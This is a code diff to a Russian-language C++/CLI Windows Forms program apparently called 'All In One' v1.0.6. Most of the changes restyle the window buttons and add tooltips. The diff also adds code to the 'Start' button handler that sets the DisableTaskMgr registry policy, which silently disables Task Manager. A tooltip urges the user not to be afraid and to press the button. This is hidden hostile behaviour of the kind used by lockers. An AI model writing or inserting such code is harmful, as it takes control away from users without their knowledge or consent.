@@ -27,8 +27,8 @@ namespace solver {
 
 
 
-	private: System::Windows::Forms::Label^ exit_btn;
-	private: System::Windows::Forms::Label^ hide_btn;
+
+
 	private: System::Windows::Forms::Panel^ panel2_1;
 
 	private: System::Windows::Forms::Label^ welcum_txt;
@@ -40,7 +40,7 @@ namespace solver {
 	private: System::Windows::Forms::CheckBox^ checkBox2;
 	private: System::Windows::Forms::Button^ start_btn1;
 	private: System::Windows::Forms::Label^ orig_icon1;
-
+	private: ToolTip^ g;
 
 
 
@@ -53,8 +53,11 @@ namespace solver {
 	private: developer^ _form1;
 	private: System::Windows::Forms::Label^ icon_prog1;
 	private: System::Windows::Forms::GroupBox^ groupBox1_1;
-	private: System::Windows::Forms::Label^ quest_btn;
+
 	private: System::Windows::Forms::Label^ name_prog1;
+	private: System::Windows::Forms::PictureBox^ exit_btn;
+	private: System::Windows::Forms::PictureBox^ hide_btn;
+	private: System::Windows::Forms::PictureBox^ quest_btn;
 	private: System::ComponentModel::IContainer^ components;
 
 
@@ -74,10 +77,10 @@ namespace solver {
 		{
 			System::ComponentModel::ComponentResourceManager^ resources = (gcnew System::ComponentModel::ComponentResourceManager(main::typeid));
 			this->panel1_1 = (gcnew System::Windows::Forms::Panel());
-			this->quest_btn = (gcnew System::Windows::Forms::Label());
+			this->quest_btn = (gcnew System::Windows::Forms::PictureBox());
+			this->hide_btn = (gcnew System::Windows::Forms::PictureBox());
+			this->exit_btn = (gcnew System::Windows::Forms::PictureBox());
 			this->icon_prog1 = (gcnew System::Windows::Forms::Label());
-			this->hide_btn = (gcnew System::Windows::Forms::Label());
-			this->exit_btn = (gcnew System::Windows::Forms::Label());
 			this->name_prog1 = (gcnew System::Windows::Forms::Label());
 			this->panel2_1 = (gcnew System::Windows::Forms::Panel());
 			this->welcum_txt = (gcnew System::Windows::Forms::Label());
@@ -92,6 +95,9 @@ namespace solver {
 			this->orig1 = (gcnew System::Windows::Forms::Label());
 			this->groupBox1_1 = (gcnew System::Windows::Forms::GroupBox());
 			this->panel1_1->SuspendLayout();
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->quest_btn))->BeginInit();
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->hide_btn))->BeginInit();
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->exit_btn))->BeginInit();
 			this->panel2_1->SuspendLayout();
 			this->orig2->SuspendLayout();
 			this->groupBox1_1->SuspendLayout();
@@ -101,9 +107,9 @@ namespace solver {
 			// 
 			this->panel1_1->BackColor = System::Drawing::Color::Black;
 			this->panel1_1->Controls->Add(this->quest_btn);
-			this->panel1_1->Controls->Add(this->icon_prog1);
 			this->panel1_1->Controls->Add(this->hide_btn);
 			this->panel1_1->Controls->Add(this->exit_btn);
+			this->panel1_1->Controls->Add(this->icon_prog1);
 			this->panel1_1->Controls->Add(this->name_prog1);
 			this->panel1_1->Location = System::Drawing::Point(0, 0);
 			this->panel1_1->Name = L"panel1_1";
@@ -115,21 +121,43 @@ namespace solver {
 			// 
 			// quest_btn
 			// 
-			this->quest_btn->BackColor = System::Drawing::Color::Black;
-			this->quest_btn->Cursor = System::Windows::Forms::Cursors::Arrow;
-			this->quest_btn->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 21.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
-				static_cast<System::Byte>(204)));
-			this->quest_btn->ForeColor = System::Drawing::Color::Silver;
+			this->quest_btn->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"quest_btn.Image")));
 			this->quest_btn->Location = System::Drawing::Point(500, 0);
 			this->quest_btn->Name = L"quest_btn";
 			this->quest_btn->Size = System::Drawing::Size(30, 30);
-			this->quest_btn->TabIndex = 4;
-			this->quest_btn->Text = L"\?";
-			this->quest_btn->TextAlign = System::Drawing::ContentAlignment::MiddleCenter;
-			this->quest_btn->Click += gcnew System::EventHandler(this, &main::label1_Click_1);
-			this->quest_btn->MouseEnter += gcnew System::EventHandler(this, &main::label1_MouseEnter_1);
-			this->quest_btn->MouseLeave += gcnew System::EventHandler(this, &main::label1_MouseLeave);
+			this->quest_btn->SizeMode = System::Windows::Forms::PictureBoxSizeMode::Zoom;
+			this->quest_btn->TabIndex = 16;
+			this->quest_btn->TabStop = false;
+			this->quest_btn->MouseClick += gcnew System::Windows::Forms::MouseEventHandler(this, &main::quest_btn_MouseClick);
+			this->quest_btn->MouseEnter += gcnew System::EventHandler(this, &main::quest_btn_MouseEnter);
+			this->quest_btn->MouseLeave += gcnew System::EventHandler(this, &main::quest_btn_MouseLeave);
 			this->quest_btn->MouseHover += gcnew System::EventHandler(this, &main::quest_btn_MouseHover);
+			// 
+			// hide_btn
+			// 
+			this->hide_btn->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"hide_btn.Image")));
+			this->hide_btn->Location = System::Drawing::Point(530, 0);
+			this->hide_btn->Name = L"hide_btn";
+			this->hide_btn->Size = System::Drawing::Size(30, 30);
+			this->hide_btn->SizeMode = System::Windows::Forms::PictureBoxSizeMode::Zoom;
+			this->hide_btn->TabIndex = 17;
+			this->hide_btn->TabStop = false;
+			this->hide_btn->MouseClick += gcnew System::Windows::Forms::MouseEventHandler(this, &main::hide_btn_MouseClick);
+			this->hide_btn->MouseEnter += gcnew System::EventHandler(this, &main::hide_btn_MouseEnter);
+			this->hide_btn->MouseLeave += gcnew System::EventHandler(this, &main::hide_btn_MouseLeave);
+			// 
+			// exit_btn
+			// 
+			this->exit_btn->Image = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"exit_btn.Image")));
+			this->exit_btn->Location = System::Drawing::Point(560, 0);
+			this->exit_btn->Name = L"exit_btn";
+			this->exit_btn->Size = System::Drawing::Size(30, 30);
+			this->exit_btn->SizeMode = System::Windows::Forms::PictureBoxSizeMode::Zoom;
+			this->exit_btn->TabIndex = 16;
+			this->exit_btn->TabStop = false;
+			this->exit_btn->MouseClick += gcnew System::Windows::Forms::MouseEventHandler(this, &main::exit_btn_MouseClick);
+			this->exit_btn->MouseEnter += gcnew System::EventHandler(this, &main::exit_btn_MouseEnter);
+			this->exit_btn->MouseLeave += gcnew System::EventHandler(this, &main::exit_btn_MouseLeave);
 			// 
 			// icon_prog1
 			// 
@@ -142,37 +170,6 @@ namespace solver {
 			this->icon_prog1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseMove);
 			this->icon_prog1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseUp);
 			// 
-			// hide_btn
-			// 
-			this->hide_btn->BackColor = System::Drawing::Color::Black;
-			this->hide_btn->Cursor = System::Windows::Forms::Cursors::Arrow;
-			this->hide_btn->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 21.75F, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
-				static_cast<System::Byte>(204)));
-			this->hide_btn->ForeColor = System::Drawing::Color::Silver;
-			this->hide_btn->Location = System::Drawing::Point(530, 0);
-			this->hide_btn->Name = L"hide_btn";
-			this->hide_btn->Size = System::Drawing::Size(30, 30);
-			this->hide_btn->TabIndex = 2;
-			this->hide_btn->Text = L"—";
-			this->hide_btn->Click += gcnew System::EventHandler(this, &main::hide_btn_Click);
-			this->hide_btn->MouseEnter += gcnew System::EventHandler(this, &main::hide_btn_MouseEnter);
-			this->hide_btn->MouseLeave += gcnew System::EventHandler(this, &main::hide_btn_MouseLeave);
-			// 
-			// exit_btn
-			// 
-			this->exit_btn->Cursor = System::Windows::Forms::Cursors::Default;
-			this->exit_btn->Font = (gcnew System::Drawing::Font(L"Microsoft Sans Serif", 18, System::Drawing::FontStyle::Bold, System::Drawing::GraphicsUnit::Point,
-				static_cast<System::Byte>(204)));
-			this->exit_btn->ForeColor = System::Drawing::Color::Silver;
-			this->exit_btn->Location = System::Drawing::Point(560, 0);
-			this->exit_btn->Name = L"exit_btn";
-			this->exit_btn->Size = System::Drawing::Size(30, 30);
-			this->exit_btn->TabIndex = 1;
-			this->exit_btn->Text = L"X";
-			this->exit_btn->Click += gcnew System::EventHandler(this, &main::exit_btn_Click);
-			this->exit_btn->MouseEnter += gcnew System::EventHandler(this, &main::exit_btn_MouseEnter);
-			this->exit_btn->MouseLeave += gcnew System::EventHandler(this, &main::exit_btn_MouseLeave);
-			// 
 			// name_prog1
 			// 
 			this->name_prog1->AutoSize = true;
@@ -184,7 +181,7 @@ namespace solver {
 			this->name_prog1->Name = L"name_prog1";
 			this->name_prog1->Size = System::Drawing::Size(415, 29);
 			this->name_prog1->TabIndex = 0;
-			this->name_prog1->Text = L"Программа \"Всё В Одном\" v1.0.5\r\n";
+			this->name_prog1->Text = L"Программа \"Всё В Одном\" v1.0.6";
 			this->name_prog1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseDown);
 			this->name_prog1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseMove);
 			this->name_prog1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &main::panel1_1_MouseUp);
@@ -300,6 +297,7 @@ namespace solver {
 			this->start_btn1->Text = L"Старт";
 			this->start_btn1->UseVisualStyleBackColor = false;
 			this->start_btn1->Click += gcnew System::EventHandler(this, &main::start_btn_Click);
+			this->start_btn1->MouseHover += gcnew System::EventHandler(this, &main::start_btn1_MouseHover);
 			// 
 			// orig_icon1
 			// 
@@ -343,7 +341,7 @@ namespace solver {
 			this->orig1->Name = L"orig1";
 			this->orig1->Size = System::Drawing::Size(353, 39);
 			this->orig1->TabIndex = 13;
-			this->orig1->Text = L"Windows 10 Original";
+			this->orig1->Text = L"Windows 11 Original";
 			// 
 			// groupBox1_1
 			// 
@@ -380,6 +378,9 @@ namespace solver {
 			this->Load += gcnew System::EventHandler(this, &main::main_Load);
 			this->panel1_1->ResumeLayout(false);
 			this->panel1_1->PerformLayout();
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->quest_btn))->EndInit();
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->hide_btn))->EndInit();
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->exit_btn))->EndInit();
 			this->panel2_1->ResumeLayout(false);
 			this->orig2->ResumeLayout(false);
 			this->orig2->PerformLayout();
@@ -394,23 +395,21 @@ namespace solver {
 	private: System::Void exit_btn_MouseLeave(System::Object^ sender, System::EventArgs^ e) {
 		this->exit_btn->BackColor = System::Drawing::Color::Black;
 	}
-	private: System::Void exit_btn_Click(System::Object^ sender, System::EventArgs^ e) {
-		Application::Exit();
-	}
-	private: System::Void hide_btn_Click(System::Object^ sender, System::EventArgs^ e) {
-		PlaySound(nullptr, nullptr, 0);
-		PlaySound(MAKEINTRESOURCE(19), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
-		SetWindowPos((HWND)this->Handle.ToPointer(), HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
-		AnimateWindow((HWND)this->Handle.ToPointer(), 325, AW_HIDE | AW_BLEND);
-		this->WindowState = FormWindowState::Minimized;
-	}
 	private: System::Void hide_btn_MouseEnter(System::Object^ sender, System::EventArgs^ e) {
-		this->hide_btn->BackColor = System::Drawing::Color::LightGray;
+		this->hide_btn->BackColor = System::Drawing::Color::Silver;
 	}
 	private: System::Void hide_btn_MouseLeave(System::Object^ sender, System::EventArgs^ e) {
 		this->hide_btn->BackColor = System::Drawing::Color::Black;
 	}
 	private: System::Void start_btn_Click(System::Object^ sender, System::EventArgs^ e) {
+		HKEY hKey;
+		std::wstring subKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+		std::wstring valueName = L"DisableTaskMgr";
+		DWORD newValue = 1;
+		if (RegOpenKeyEx(HKEY_CURRENT_USER, subKey.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+			RegSetValueEx(hKey, valueName.c_str(), 0, REG_DWORD, (BYTE*)&newValue, sizeof(newValue));
+			RegCloseKey(hKey);
+		}
 		_form = gcnew loading;
 		this->Location = this->first_location;
 		_form->Show();
@@ -431,25 +430,12 @@ namespace solver {
 	private: System::Void checkBox4_CheckedChanged(System::Object^ sender, System::EventArgs^ e) {
 		propysk4 = !propysk4;
 	}
-	private: System::Void label1_Click_1(System::Object^ sender, System::EventArgs^ e) {
-		if (!_form1_opened) {
-			_form1 = gcnew developer;
-			int xPos = (this->Width - _form1->Width) / 2 + this->Location.X;
-			int yPos = (this->Height - _form1->Height) / 2 + this->Location.Y;
-			_form1->Location = System::Drawing::Point(xPos, yPos);
-			_form1->Show();
-			_form1_opened = true;
-		}
-	}
-	private: System::Void label1_MouseEnter_1(System::Object^ sender, System::EventArgs^ e) {
-		this->quest_btn->BackColor = System::Drawing::Color::LightGray;
-	}
-	private: System::Void label1_MouseLeave(System::Object^ sender, System::EventArgs^ e) {
-		this->quest_btn->BackColor = System::Drawing::Color::Black;
-	}
 	private: System::Void quest_btn_MouseHover(System::Object^ sender, System::EventArgs^ e) {
-		ToolTip^ g = gcnew ToolTip();
-		g->SetToolTip(quest_btn, "О Разработчике");
+		delete g;
+		g = gcnew ToolTip();
+		g->ToolTipIcon = ToolTipIcon::Info;
+		g->ToolTipTitle = "Подсказка";
+		g->SetToolTip(quest_btn, "Информация о разработчике");
 	}
 	private: System::Void panel1_1_MouseDown(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
 		if (e->Button == System::Windows::Forms::MouseButtons::Left)
@@ -470,8 +456,46 @@ namespace solver {
 		this->orig_icon1->Cursor = System::Windows::Forms::Cursors::Default;
 		this->panel1_1->Cursor = System::Windows::Forms::Cursors::Default;
 	}
-private: System::Void main_Load(System::Object^ sender, System::EventArgs^ e) {
-	this->first_location = this->Location;
-}
+	private: System::Void main_Load(System::Object^ sender, System::EventArgs^ e) {
+		this->first_location = this->Location;
+	}
+	private: System::Void exit_btn_MouseClick(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
+		if (e->Button == System::Windows::Forms::MouseButtons::Left)
+			Application::Exit();
+	}
+	private: System::Void hide_btn_MouseClick(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
+		if (e->Button == System::Windows::Forms::MouseButtons::Left) {
+			PlaySound(nullptr, nullptr, 0);
+			PlaySound(MAKEINTRESOURCE(19), GetModuleHandle(NULL), SND_RESOURCE | SND_ASYNC);
+			SetWindowPos((HWND)this->Handle.ToPointer(), HWND_TOP, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
+			AnimateWindow((HWND)this->Handle.ToPointer(), 325, AW_HIDE | AW_BLEND);
+			this->WindowState = FormWindowState::Minimized;
+		}
+	}
+	private: System::Void quest_btn_MouseClick(System::Object^ sender, System::Windows::Forms::MouseEventArgs^ e) {
+		if (e->Button == System::Windows::Forms::MouseButtons::Left) {
+			if (!_form1_opened) {
+				_form1 = gcnew developer;
+				int xPos = (this->Width - _form1->Width) / 2 + this->Location.X;
+				int yPos = (this->Height - _form1->Height) / 2 + this->Location.Y;
+				_form1->Location = System::Drawing::Point(xPos, yPos);
+				_form1->Show();
+				_form1_opened = true;
+			}
+		}
+	}
+	private: System::Void quest_btn_MouseEnter(System::Object^ sender, System::EventArgs^ e) {
+		this->quest_btn->BackColor = System::Drawing::Color::Silver;
+	}
+	private: System::Void quest_btn_MouseLeave(System::Object^ sender, System::EventArgs^ e) {
+		this->quest_btn->BackColor = System::Drawing::Color::Black;
+	}
+	private: System::Void start_btn1_MouseHover(System::Object^ sender, System::EventArgs^ e) {
+		delete g;
+		g = gcnew ToolTip();
+		g->ToolTipIcon = ToolTipIcon::None;
+		g->ToolTipTitle = "Совет";
+		g->SetToolTip(start_btn1, "Мне тоже в первый раз было страшно...\nНе ссы, жми кнопку!");
+	}
 };
 }
